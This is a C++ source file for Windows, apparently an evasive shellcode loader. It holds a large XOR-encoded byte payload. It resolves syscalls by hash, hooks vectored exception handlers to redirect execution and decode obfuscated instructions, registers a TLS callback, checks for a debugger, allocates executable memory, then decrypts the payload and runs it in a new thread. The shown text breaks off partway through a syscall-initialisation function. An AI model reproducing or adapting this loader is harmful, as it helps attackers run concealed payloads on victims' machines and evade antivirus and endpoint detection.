#include <Windows.h>
#include <iostream>
#include <fstream>
#include "pe_parser.h"
#include "syscall_retriever.h"
#include "native_functions.h"
#include "hash.h"
#include "memoryapi.h"

INT16 SysNtAllocateVirtualMem;
INT16 SysNtWriteVirtualMem;     
INT16 SysNtProtectVirtualMem;   
INT16 SysNtCreateThreadEx;        
INT16 SysNtWaitForSingleObject;  
INT16 SysNtCreateSection;
INT16 SysNtMapViewOfSection;
INT16 SysNtQueryInformationProcess;
INT16 SysNtReadVirtualMem;

_NtAllocateVirtualMemory pNtAllocateVirtualMemory;
_NtWriteVirtualMemory pNtWriteVirtualMemory;
_NtProtectVirtualMemory pNtProtectVirtualMemory;
_NtCreateThreadEx pNtCreateThreadEx;
_NtWaitForSingleObject pNtWaitForSingleObject;
_NtMapViewOfSection pNtMapViewOfSection;
_NtCreateSection pNtCreateSection;
_NtQueryInformationProcess pNtQueryInformationProcess;
_NtWriteVirtualMemory pNtReadVirtualMemory;

HANDLE thread;
HANDLE current_process;
PVOID base = nullptr;
SIZE_T bytesWritten = 0;

BYTE* g_syscall_addr;

unsigned char buffer[3584] = {
    111, 113, 178, 205, 113, 186, 221, 201, 113, 186, 213, 25, 209, 60, 57, 57, 57, 113, 178, 223, 103, 250, 113, 184, 213, 161, 57, 57, 57, 113, 180, 117, 29, 25, 54, 50, 51, 57, 182, 158, 25, 30, 248, 76, 2, 183, 63, 57, 57, 54, 143, 249, 188, 249, 76, 62, 129, 56, 57, 57, 57, 210, 97, 113, 180, 109, 29, 9, 113, 180, 117, 29, 25, 209, 104, 61, 57, 57, 54, 143, 249, 188, 249, 76, 62, 129, 56, 57, 57, 57, 210, 2, 95, 120, 128, 129, 38, 209, 51, 57, 57, 57, 8, 11, 14, 23, 9, 23, 9, 23, 8, 57, 120, 97, 54, 50, 63, 57, 67, 139, 162, 180, 109, 29, 9, 113, 180, 117, 29, 25, 209, 27, 57, 57, 57, 54, 143, 249, 188, 249, 76, 62, 129, 56, 57, 57, 57, 210, 59, 10, 249, 54, 50, 51, 57, 154, 135, 73, 27, 141, 237, 162, 184, 253, 161, 57, 57, 57, 250, 54, 50, 63, 57, 245, 70, 140, 125, 176, 117, 29, 25, 117, 176, 125, 29, 33, 113, 176, 109, 29, 41, 113, 176, 117, 29, 49, 169, 169, 169, 113, 184, 213, 209, 56, 57, 57, 113, 180, 109, 29, 121, 95, 128, 59, 59, 113, 178, 189, 29, 193, 56, 57, 57, 198, 41, 188, 249, 54, 50, 62, 57, 48, 21, 74, 158, 62, 11, 249, 208, 205, 57, 57, 57, 120, 129, 63, 57, 57, 57, 131, 56, 57, 57, 57, 128, 59, 57, 57, 57, 113, 178, 189, 29, 193, 56, 57, 57, 198, 105, 49, 169, 169, 169, 169, 113, 176, 125, 29, 17, 113, 186, 69, 29, 17, 198, 76, 43, 113, 178, 189, 29, 193, 56, 57, 57, 198, 105, 105, 11, 249, 208, 143, 57, 57, 57, 129, 59, 57, 57, 57, 95, 176, 125, 29, 9, 54, 142, 181, 29, 49, 59, 57, 57, 113, 178, 189, 29, 193, 56, 57, 57, 198, 105, 113, 95, 176, 125, 29, 11, 113, 178, 181, 29, 57, 59, 57, 57, 113, 178, 189, 29, 193, 56, 57, 57, 198, 105, 41, 176, 125, 29, 13, 120, 129, 41, 57, 57, 57, 113, 180, 109, 29, 9, 113, 178, 117, 29, 17, 113, 178, 189, 29, 193, 56, 57, 57, 198, 105, 33, 186, 193, 198, 76, 28, 113, 178, 117, 29, 17, 113, 178, 189, 29, 193, 56, 57, 57, 198, 105, 121, 113, 178, 189, 29, 193, 56, 57, 57, 54, 50, 63, 57, 141, 145, 21, 105, 105, 11, 249, 210, 1, 117, 180, 125, 29, 17, 113, 178, 173, 29, 193, 56, 57, 57, 113, 178, 181, 29, 201, 56, 57, 57, 209, 31, 57, 57, 57, 54, 143, 249, 188, 249, 76, 51, 254, 125, 29, 25, 56, 57, 57, 57, 210, 49, 254, 125, 29, 25, 57, 57, 57, 57, 54, 143, 125, 29, 25, 113, 184, 253, 209, 56, 57, 57, 250, 117, 176, 125, 29, 33, 113, 176, 109, 29, 41, 113, 176, 117, 29, 49, 113, 184, 213, 81, 59, 57, 57, 131, 60, 57, 57, 57, 113, 178, 189, 29, 185, 59, 57, 57, 169, 169, 169, 169, 113, 178, 49, 113, 178, 189, 29, 65, 59, 57, 57, 198, 105, 25, 186, 193, 198, 76, 17, 113, 178, 189, 29, 185, 59, 57, 57, 113, 178, 49, 113, 178, 189, 29, 65, 59, 57, 57, 198, 105, 121, 113, 178, 189, 29, 65, 59, 57, 57, 198, 105, 105, 11, 249, 208, 195, 57, 57, 57, 254, 125, 29, 121, 41, 57, 57, 57, 117, 180, 125, 29, 121, 113, 180, 109, 29, 113, 113, 178, 189, 29, 185, 59, 57, 57, 113, 178, 49, 113, 178, 189, 29, 65, 59, 57, 57, 169, 169, 198, 105, 17, 54, 50, 63, 57, 147, 234, 162, 176, 125, 29, 1, 254, 125, 29, 125, 153, 191, 56, 57, 254, 125, 29, 25, 61, 57, 57, 57, 117, 180, 117, 29, 125, 120, 129, 63, 41, 57, 57, 131, 198, 198, 57, 57, 113, 178, 117, 29, 1, 113, 178, 189, 29, 65, 59, 57, 57, 198, 105, 97, 169, 113, 186, 69, 29, 1, 198, 76, 28, 113, 178, 189, 29, 185, 59, 57, 57, 113, 178, 49, 113, 178, 189, 29, 65, 59, 57, 57, 198, 105, 121, 113, 178, 189, 29, 65, 59, 57, 57, 198, 105, 105, 11, 249, 210, 94, 124, 10, 240, 120, 129, 57, 59, 57, 57, 113, 180, 109, 29, 89, 113, 178, 117, 29, 1, 113, 178, 189, 29, 65, 59, 57, 57, 54, 50, 60, 57, 209, 21, 105, 9, 176, 125, 29, 9, 186, 69, 29, 9, 57, 71, 14, 178, 109, 29, 9, 113, 180, 117, 29, 89, 54, 50, 49, 57, 174, 189, 39, 53, 2, 18, 57, 57, 57, 124, 10, 240, 125, 178, 125, 29, 9, 113, 180, 109, 29, 89, 113, 178, 117, 29, 1, 113, 178, 189, 29, 65, 59, 57, 57, 198, 105, 1, 11, 249, 210, 59, 137, 56, 113, 184, 253, 81, 59, 57, 57, 250, 176, 109, 29, 41, 113, 176, 117, 29, 49, 111, 110, 113, 186, 213, 1, 113, 180, 125, 29, 41, 209, 33, 57, 57, 57, 92, 119, 122, 8, 75, 96, 73, 77, 8, 9, 87, 74, 102, 24, 24, 24, 57, 57, 57, 57, 57, 57, 57, 57, 96, 113, 178, 193, 113, 178, 200, 169, 169, 169, 169, 128, 40, 57, 57, 57, 202, 157, 254, 61, 29, 57, 57, 57, 57, 210, 49, 178, 61, 29, 198, 249, 176, 61, 29, 178, 125, 29, 97, 0, 61, 29, 54, 180, 177, 57, 57, 57, 113, 90, 61, 29, 113, 178, 117, 29, 105, 54, 135, 61, 56, 176, 125, 29, 49, 178, 61, 29, 160, 186, 219, 54, 58, 251, 186, 217, 54, 18, 251, 54, 50, 63, 57, 73, 45, 162, 161, 54, 135, 125, 61, 41, 178, 117, 29, 49, 10, 241, 178, 248, 113, 90, 53, 29, 113, 178, 109, 29, 105, 177, 61, 51, 113, 90, 61, 29, 113, 178, 117, 29, 105, 54, 135, 61, 56, 176, 125, 29, 53, 169, 169, 169, 169, 178, 61, 29, 160, 186, 219, 54, 58, 251, 186, 217, 54, 18, 251, 113, 161, 54, 135, 125, 61, 41, 178, 117, 29, 53, 58, 241, 178, 248, 54, 50, 60, 57, 57, 162, 90, 53, 29, 113, 178, 109, 29, 105, 177, 61, 51, 208, 90, 198, 198, 198, 254, 125, 29, 61, 56, 57, 57, 57, 54, 50, 63, 57, 38, 122, 1, 51, 178, 125, 29, 61, 198, 249, 176, 125, 29, 61, 178, 125, 29, 97, 0, 125, 29, 61, 68, 1, 113, 90, 125, 29, 61, 113, 178, 117, 29, 105, 54, 135, 61, 56, 178, 117, 29, 61, 198, 240, 113, 90, 240, 113, 178, 109, 29, 105, 54, 135, 53, 51, 54, 50, 62, 57, 6, 73, 252, 233, 248, 113, 90, 117, 29, 61, 113, 178, 109, 29, 105, 177, 61, 51, 210, 141, 113, 186, 253, 1, 102, 103, 250, 113, 176, 109, 29, 41, 113, 176, 117, 29, 49, 113, 186, 213, 1, 209, 41, 57, 57, 57, 110, 106, 11, 102, 10, 11, 23, 93, 85, 85, 57, 57, 57, 57, 57, 57, 96, 113, 178, 125, 29, 121, 198, 41, 113, 176, 125, 29, 25, 209, 53, 57, 57, 57, 110, 106, 120, 106, 77, 88, 75, 77, 76, 73, 57, 57, 99, 113, 178, 117, 29, 25, 113, 178, 125, 29, 121, 198, 105, 49, 54, 50, 62, 57, 3, 238, 199, 162, 178, 117, 29, 113, 113, 176, 56, 209, 53, 57, 57, 57, 74, 86, 90, 82, 92, 77, 57, 57, 57, 57, 57, 57, 99, 113, 178, 117, 29, 25, 113, 178, 125, 29, 121, 198, 105, 49, 113, 178, 117, 29, 113, 113, 176, 120, 49, 209, 53, 57, 57, 57, 80, 87, 92, 77, 102, 88, 93, 93, 75, 57, 57, 57, 99, 113, 178, 117, 29, 25, 113, 178, 125, 29, 121, 198, 105, 49, 113, 178, 117, 29, 113, 54, 50, 63, 57, 136, 14, 162, 176, 120, 41, 209, 49, 57, 57, 57, 91, 80, 87, 93, 57, 57, 57, 57, 99, 113, 178, 117, 29, 25, 113, 178, 125, 29, 121, 198, 105, 49, 54, 50, 60, 57, 57, 162, 178, 117, 29, 113, 113, 176, 120, 33, 209, 49, 57, 57, 57, 85, 80, 74, 77, 92, 87, 57, 57, 99, 113, 178, 117, 29, 25, 113, 178, 125, 29, 121, 198, 105, 49, 113, 178, 117, 29, 113, 113, 176, 120, 25, 209, 49, 57, 57, 57, 88, 90, 90, 92, 73, 77, 57, 57, 99, 113, 178, 117, 29, 25, 113, 178, 125, 29, 121, 198, 105, 49, 113, 178, 117, 29, 113, 113, 176, 120, 17, 209, 49, 57, 57, 57, 75, 92, 90, 79, 57, 57, 57, 57, 99, 113, 178, 117, 29, 25, 113, 178, 125, 29, 121, 198, 105, 49, 113, 178, 117, 29, 113, 113, 176, 120, 9, 209, 53, 57, 57, 57, 74, 92, 87, 93, 57, 57, 57, 57, 57, 57, 57, 57, 99, 113, 178, 117, 29, 25, 113, 178, 125, 29, 121, 198, 105, 49, 113, 178, 117, 29, 113, 113, 176, 120, 1, 209, 53, 57, 57, 57, 90, 85, 86, 74, 92, 74, 86, 90, 82, 92, 77, 57, 99, 113, 178, 117, 29, 25, 113, 178, 125, 29, 121, 198, 105, 49, 113, 178, 117, 29, 113, 113, 176, 120, 121, 209, 53, 57, 57, 57, 81, 77, 86, 87, 74, 57, 57, 57, 57, 57, 57, 57, 99, 113, 178, 117, 29, 25, 113, 178, 125, 29, 121, 198, 105, 49, 113, 178, 117, 29, 113, 113, 176, 120, 113, 209, 41, 57, 57, 57, 110, 106, 120, 122, 85, 92, 88, 87, 76, 73, 57, 57, 57, 57, 57, 57, 99, 113, 178, 117, 29, 25, 113, 178, 125, 29, 121, 198, 105, 49, 113, 178, 117, 29, 113, 113, 176, 120, 105, 209, 41, 57, 57, 57, 74, 92, 77, 74, 86, 90, 82, 86, 73, 77, 57, 57, 57, 57, 57, 57, 99, 113, 178, 117, 29, 25, 113, 178, 125, 29, 121, 198, 105, 49, 113, 178, 117, 29, 113, 113, 176, 120, 97, 137, 56, 113, 186, 253, 1, 250, 113, 176, 117, 29, 49, 113, 186, 213, 113, 209, 25, 57, 57, 57, 82, 57, 92, 57, 75, 57, 87, 57, 92, 57, 85, 57, 10, 57, 11, 57, 23, 57, 93, 57, 85, 57, 85, 57, 57, 57, 57, 57, 57, 57, 57, 57, 96, 209, 56, 58, 57, 57, 113, 176, 125, 29, 25, 113, 186, 69, 29, 25, 57, 76, 62, 11, 249, 208, 191, 57, 57, 57, 209, 41, 57, 57, 57, 117, 86, 88, 93, 117, 80, 91, 75, 88, 75, 64, 120, 57, 57, 57, 57, 99, 113, 178, 117, 29, 25, 209, 82, 57, 57, 57, 113, 176, 125, 29, 17, 113, 186, 69, 29, 17, 57, 76, 61, 11, 249, 210, 108, 209, 41, 57, 57, 57, 126, 92, 77, 105, 75, 86, 90, 120, 93, 93, 75, 92, 74, 74, 57, 57, 99, 169, 169, 169, 113, 178, 117, 29, 25, 209, 14, 57, 57, 57, 169, 169, 169, 169, 113, 176, 125, 29, 9, 113, 186, 69, 29, 9, 57, 76, 61, 11, 249, 210, 36, 113, 178, 125, 29, 105, 113, 178, 117, 29, 17, 113, 176, 49, 113, 178, 125, 29, 105, 113, 178, 117, 29, 9, 113, 176, 113, 49, 137, 56, 113, 186, 253, 113, 250, 113, 176, 109, 29, 41, 113, 176, 117, 29, 49, 113, 186, 213, 65, 113, 178, 189, 29, 185, 57, 57, 57, 113, 176, 125, 29, 9, 113, 178, 125, 29, 9, 54, 142, 57, 4, 116, 99, 57, 57, 169, 169, 169, 169, 77, 53, 10, 249, 54, 50, 60, 57, 203, 3, 26, 59, 57, 57, 113, 178, 125, 29, 9, 113, 90, 121, 5, 113, 178, 181, 29, 185, 57, 57, 57, 113, 58, 241, 113, 178, 248, 113, 176, 125, 29, 121, 129, 49, 57, 57, 57, 113, 82, 249, 57, 113, 178, 117, 29, 121, 113, 180, 189, 56, 177, 57, 57, 57, 113, 176, 125, 29, 1, 113, 178, 125, 29, 1, 186, 1, 57, 76, 62, 10, 249, 208, 226, 56, 57, 57, 113, 178, 125, 29, 1, 178, 57, 176, 125, 29, 33, 178, 125, 29, 33, 113, 58, 189, 29, 185, 57, 57, 57, 113, 176, 125, 29, 41, 113, 178, 125, 29, 41, 178, 121, 33, 113, 176, 125, 29, 113, 113, 178, 125, 29, 41, 178, 121, 37, 176, 125, 29, 29, 113, 178, 125, 29, 41, 178, 121, 25, 176, 125, 29, 37, 113, 178, 125, 29, 41, 178, 121, 29, 54, 50, 62, 57, 169, 26, 44, 99, 125, 29, 25, 113, 254, 125, 29, 49, 57, 57, 57, 57, 210, 52, 113, 178, 125, 29, 49, 113, 198, 249, 113, 176, 125, 29, 49, 113, 178, 125, 29, 113, 113, 0, 125, 29, 49, 54, 186, 100, 56, 57, 57, 178, 125, 29, 37, 113, 178, 181, 29, 185, 57, 57, 57, 113, 58, 241, 113, 178, 248, 113, 178, 117, 29, 49, 113, 180, 61, 177, 113, 176, 125, 29, 97, 178, 125, 29, 25, 113, 178, 181, 29, 185, 57, 57, 57, 113, 58, 241, 113, 178, 248, 113, 178, 117, 29, 49, 113, 180, 61, 113, 113, 176, 125, 29, 105, 178, 125, 29, 29, 113, 178, 181, 29, 185, 57, 57, 57, 113, 58, 241, 113, 178, 248, 54, 50, 63, 57, 251, 215, 162, 178, 117, 29, 105, 54, 142, 48, 113, 180, 61, 177, 113, 176, 125, 29, 89, 113, 178, 125, 29, 97, 178, 57, 113, 178, 181, 29, 185, 57, 57, 57, 113, 58, 241, 113, 178, 248, 113, 176, 125, 29, 17, 113, 254, 61, 29, 57, 57, 57, 57, 210, 50, 113, 178, 61, 29, 113, 198, 249, 113, 176, 61, 29, 113, 178, 61, 29, 113, 178, 181, 29, 177, 57, 57, 57, 113, 58, 241, 113, 178, 248, 54, 135, 57, 188, 249, 169, 169, 169, 169, 77, 109, 113, 178, 61, 29, 113, 178, 117, 29, 17, 113, 58, 241, 113, 178, 248, 54, 135, 57, 188, 249, 169, 169, 169, 169, 77, 3, 113, 178, 61, 29, 113, 178, 181, 29, 177, 57, 57, 57, 113, 58, 241, 113, 178, 248, 54, 135, 57, 169, 169, 169, 169, 113, 178, 53, 29, 113, 178, 109, 29, 17, 113, 58, 232, 113, 178, 243, 54, 135, 48, 2, 248, 169, 169, 169, 77, 63, 169, 169, 169, 169, 210, 59, 210, 189, 113, 178, 61, 29, 113, 178, 181, 29, 177, 57, 57, 57, 113, 58, 241, 113, 178, 248, 54, 135, 57, 188, 249, 76, 15, 113, 178, 61, 29, 113, 178, 117, 29, 17, 113, 58, 241, 113, 178, 248, 54, 135, 57, 169, 169, 169, 169, 188, 249, 76, 37, 113, 178, 125, 29, 89, 178, 57, 113, 178, 181, 29, 185, 57, 57, 57, 113, 58, 241, 113, 178, 248, 54, 50, 60, 57, 201, 1, 62, 208, 191, 199, 198, 198, 10, 249, 113, 186, 253, 65, 250, 113, 176, 117, 29, 49, 113, 186, 213, 97, 92, 113, 178, 61, 28, 89, 57, 57, 57, 113, 176, 125, 29, 121, 113, 178, 125, 29, 121, 113, 178, 121, 33, 113, 176, 125, 29, 113, 113, 178, 125, 29, 113, 113, 186, 249, 25, 113, 176, 125, 29, 1, 113, 178, 125, 29, 1, 113, 178, 57, 113, 176, 125, 29, 9, 210, 52, 113, 178, 125, 29, 9, 113, 178, 57, 113, 176, 125, 29, 9, 113, 178, 125, 29, 1, 113, 0, 125, 29, 9, 54, 189, 239, 56, 57, 57, 113, 178, 125, 29, 9, 113, 186, 209, 41, 169, 169, 113, 176, 125, 29, 17, 113, 186, 69, 29, 17, 57, 77, 53, 113, 178, 125, 29, 17, 113, 186, 65, 9, 57, 76, 60, 208, 148, 56, 57, 57, 113, 178, 125, 29, 17, 113, 178, 121, 89, 113, 176, 125, 29, 41, 113, 186, 69, 29, 41, 57, 76, 59, 210, 155, 113, 254, 61, 29, 57, 57, 57, 57, 210, 50, 113, 178, 61, 29, 113, 198, 249, 113, 176, 61, 29, 113, 178, 125, 29, 17, 54, 142, 121, 97, 113, 0, 61, 29, 54, 186, 13, 56, 57, 57, 113, 178, 125, 29, 89, 113, 178, 53, 29, 54, 142, 61, 113, 188, 249, 77, 40, 113, 178, 125, 29, 41, 113, 178, 53, 29, 54, 142, 61, 113, 188, 249, 76, 60, 208, 52, 56, 57, 57, 113, 178, 125, 29, 89, 113, 178, 53, 29, 54, 142, 61, 113, 186, 193, 99, 70, 115, 113, 178, 125, 29, 89, 113, 178, 53, 29, 54, 142, 61, 113, 186, 193, 120, 69, 1, 113, 178, 125, 29, 89, 113, 178, 53, 29, 54, 142, 61, 113, 186, 209, 120, 186, 249, 88, 176, 125, 29, 25, 113, 178, 125, 29, 89, 113, 178, 53, 29, 54, 142, 109, 29, 25, 95, 176, 45, 113, 54, 142, 125, 29, 25, 95, 176, 125, 29, 49, 169, 169, 169, 210, 43, 113, 178, 125, 29, 89, 113, 178, 53, 29, 54, 142, 61, 113, 95, 176, 125, 29, 49, 54, 142, 125, 29, 49, 95, 176, 125, 29, 33, 113, 178, 125, 29, 41, 113, 178, 53, 29, 54, 142, 61, 113, 186, 193, 99, 70, 116, 113, 178, 125, 29, 41, 113, 178, 53, 29, 54, 142, 61, 113, 186, 193, 120, 54, 50, 63, 57, 195, 210, 150, 12, 113, 178, 125, 29, 41, 113, 178, 53, 29, 54, 142, 61, 113, 186, 209, 120, 186, 249, 88, 176, 125, 29, 29, 113, 178, 125, 29, 41, 113, 178, 53, 29, 54, 142, 109, 29, 29, 95, 176, 45, 113, 54, 142, 125, 29, 29, 95, 176, 125, 29, 51, 210, 43, 113, 178, 125, 29, 41, 113, 178, 53, 29, 54, 142, 61, 113, 95, 176, 125, 29, 51, 54, 142, 125, 29, 51, 95, 176, 125, 29, 37, 54, 142, 125, 29, 33, 54, 142, 117, 29, 37, 2, 248, 54, 50, 60, 57, 192, 158, 59, 210, 60, 208, 151, 199, 198, 198, 113, 178, 125, 29, 89, 113, 178, 53, 29, 54, 142, 61, 113, 188, 249, 76, 26, 113, 178, 125, 29, 41, 113, 178, 53, 29, 54, 142, 61, 113, 188, 249, 54, 50, 62, 57, 64, 106, 116, 159, 50, 113, 178, 125, 29, 17, 113, 178, 121, 9, 210, 62, 208, 52, 199, 198, 198, 10, 249, 113, 186, 253, 97, 250, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57
};
SIZE_T len_buffer = sizeof(buffer);

std::vector<uint8_t> init_fileRead(const char* path);
bool init_syscalls(PE_PARSER& parser, std::vector<uint8_t>& fileData);
void executeBuffer(unsigned char buffer[], SIZE_T size);
void debug_check();

bool execute = 0;

LONG CALLBACK VectoredExceptionHandler(EXCEPTION_POINTERS* ExceptionInfo);
LONG CALLBACK VectoredExceptionHandler2(EXCEPTION_POINTERS* ExceptionInfo);

LONG CALLBACK VectoredExceptionHandler(EXCEPTION_POINTERS* ExceptionInfo) {
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION && execute) {
        ExceptionInfo->ContextRecord->R10 = ExceptionInfo->ContextRecord->Rcx;
        ExceptionInfo->ContextRecord->Rax = ExceptionInfo->ContextRecord->Rip;
        ExceptionInfo->ContextRecord->Rip = (DWORD64)g_syscall_addr;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

LONG CALLBACK VectoredExceptionHandler2(EXCEPTION_POINTERS* ExceptionInfo) {
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ILLEGAL_INSTRUCTION) {
        NTSTATUS status;

        uint8_t* rip = (uint8_t*)ExceptionInfo->ContextRecord->Rip;

        BYTE increment = 0;
        SIZE_T bytesRead = 0;
        BYTE check = 0;
        BYTE obfuscated_instruction = 0;
        SIZE_T bytesWritten = 0;

        status = pNtReadVirtualMemory(current_process, (PVOID)(rip + 2), &increment, sizeof(BYTE), &bytesRead);
        if (!NT_SUCCESS(status)) {
            std::cout << GetLastError() << "\n";
            exit(200);
        }

        status = pNtReadVirtualMemory(current_process, (PVOID)(rip + 3), &check, sizeof(BYTE), &bytesRead);
        if (!NT_SUCCESS(status) or bytesRead!=1) {
            std::cout << GetLastError() << "\n";
            exit(200);
        }

        if (check == 0) {
            check = 1;
            status = pNtReadVirtualMemory(current_process, (PVOID)(rip + increment), &obfuscated_instruction, sizeof(BYTE), &bytesRead);
            if (!NT_SUCCESS(status)) {
                std::cout << GetLastError() << "\n";
                exit(200);
            }

            obfuscated_instruction = obfuscated_instruction ^ 0xd3;

            status = pNtWriteVirtualMemory(current_process, (PVOID)(rip + increment), &obfuscated_instruction, sizeof(BYTE), &bytesWritten);
            if (!NT_SUCCESS(status)) {
                std::cout << GetLastError() << "\n";
                exit(300);
            }
            status = pNtWriteVirtualMemory(current_process, (PVOID)(rip + 3), &check, sizeof(BYTE), &bytesWritten);
            if (!NT_SUCCESS(status)) {
                std::cout << GetLastError() << "\n";
                exit(300);
            }
        }

        ExceptionInfo->ContextRecord->Rip = (DWORD64)(rip + increment);
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;  
}

LONG CALLBACK VectoredExceptionHandler3(EXCEPTION_POINTERS* ExceptionInfo) {
    std::cout << "Unhandled exception" << "\n";
    exit(5);
}

void NTAPI TLSCallback(PVOID DllHandle, DWORD Reason, PVOID Reserved) {
    if (Reason == DLL_PROCESS_ATTACH) {
        HANDLE handle3 = AddVectoredExceptionHandler(0, VectoredExceptionHandler3);
        HANDLE handle2 = AddVectoredExceptionHandler(1, VectoredExceptionHandler2);
        HANDLE handle = AddVectoredExceptionHandler(1, VectoredExceptionHandler);
        if (!handle2 || !handle || !handle3) {
            exit(10);
        }
    }
}

#ifdef _MSC_VER
#pragma comment(linker, "/INCLUDE:_tls_used")
#pragma comment(linker, "/INCLUDE:tls_callback")

#pragma const_seg(".CRT$XLF")
EXTERN_C const PIMAGE_TLS_CALLBACK tls_callback = TLSCallback;
#pragma const_seg()
#endif

void decrypt_buffer() {
    for (int i = 0; i < len_buffer; i++) {
        buffer[i] = buffer[i] ^ 0x39;
    }
}

__declspec(noinline) DWORD WINAPI decrypt_buffer_thread(LPVOID lpParam) {
    decrypt_buffer();
    return 0;
}

__declspec(noinline) NTSTATUS create_payload_thread() {
    HANDLE thread;
    NTSTATUS status = pNtCreateThreadEx(
        &thread,
        THREAD_ALL_ACCESS,
        NULL,
        current_process,
        (LPTHREAD_START_ROUTINE)base,
        NULL,
        0,
        0, 0, 0, 0
    );

    if (!NT_SUCCESS(status)) {
        exit(1);
    }

    return status;
}

__declspec(noinline) NTSTATUS write_to_virtual_memory(SIZE_T size) {
    SIZE_T bytesWritten = 0;
    NTSTATUS status = pNtWriteVirtualMemory(
        current_process,
        base,
        buffer,
        size,
        &bytesWritten
    );

    if (!NT_SUCCESS(status)) {
        if (status != 0x8000000D) { // Partial write error
            exit(1);
        }
    }

    return create_payload_thread();
}

__declspec(noinline) NTSTATUS allocate_virtual_memory(SIZE_T size) {
    NTSTATUS status = pNtAllocateVirtualMemory(
        current_process,
        &base,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!NT_SUCCESS(status)) {
        exit(1);
    }

    HANDLE thread;
    status = pNtCreateThreadEx(
        &thread,
        THREAD_ALL_ACCESS,
        NULL,
        current_process,
        (LPTHREAD_START_ROUTINE)decrypt_buffer_thread,
        NULL,
        0,
        0, 0, 0, 0
    );

    if (!NT_SUCCESS(status)) {
        exit(1);
    }
    Sleep(100);

    return write_to_virtual_memory(size);
}

__declspec(noinline) void executeBuffer(unsigned char buffer[], SIZE_T size) {
    NTSTATUS status;
    HANDLE decrypt;
    current_process = GetCurrentProcess();
    debug_check();
    allocate_virtual_memory(size);
    Sleep(15000);
    CloseHandle(thread);
}

__declspec(noinline) void debug_check() {
    DWORD64 dwProcessDebugPort;
    ULONG dwReturned;
    NTSTATUS status = pNtQueryInformationProcess(
        GetCurrentProcess(),
        ProcessDebugPort,
        &dwProcessDebugPort,
        8,
        &dwReturned);

    if (NT_SUCCESS(status) && (-1 == dwProcessDebugPort)) {
        Sleep(3000);
        ExitProcess(2);
    }
    if (!NT_SUCCESS(status)) {
        std::cout << std::hex << (int)status << "\n";
    }
}

__declspec(noinline) bool init_NtAllocateVirtualMemory(PE_PARSER& parser, std::vector<uint8_t>& fileData) {
    SysNtAllocateVirtualMem = syscall_num(1981666927, parser, fileData);
    if (!SysNtAllocateVirtualMem) {
        exit(-1);
    }
    pNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)SysNtAllocateVirtualMem;
    return true;
}

__declspec(noinline) bool init_NtWriteVirtualMemory(PE_PARSER& parser, std::vector<uint8_t>& fileData) {
    SysNtWriteVirtualMem = syscall_num(4121089429, parser, fileData);
    if (!SysNtWriteVirtualMem) {
        exit(-1);
    }
    pNtWriteVirtualMemory = (_NtWriteVirtualMemory)SysNtWriteVirtualMem;
    return init_NtAllocateVirtualMemory(parser,fileData);
}

__declspec(noinline) bool init_NtReadVirtualMemory(PE_PARSER& parser, std::vector<uint8_t>& fileData) {
    SysNtReadVirtualMem = syscall_num(3958398086, parser, fileData);
    if (!SysNtReadVirtualMem) {
        exit(-1);
    }
    pNtReadVirtualMemory = (_NtReadVirtualMemory)SysNtReadVirtualMem;
    return init_NtWriteVirtualMemory(parser, fileData);
}

__declspec(noinline) bool init_NtProtectVirtualMemory(PE_PARSER& parser, std::vector<uint8_t>& fileData) {
    SysNtProtectVirtualMem = syscall_num(274472331, parser, fileData);
    if (!SysNtProtectVirtualMem) {
        exit(-1);
    }
